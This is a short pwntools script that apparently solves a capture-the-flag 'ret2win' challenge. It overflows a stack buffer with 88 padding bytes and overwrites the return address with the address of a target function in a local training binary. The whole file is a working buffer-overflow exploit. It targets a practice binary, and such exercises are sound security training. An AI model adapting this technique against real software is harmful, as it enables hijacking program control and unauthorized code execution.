#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("/challenge/ret2win")

gs = '''
b *vuln+41
continue
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)



io = start()

# io.recvuntil(b"puts() @ ", timeout=0.1)
io.recvline()
payload = b'A'*80 + b'B'*8
ret_add = p64(0x4011b6)
io.sendline(payload+ret_add)

io.interactive()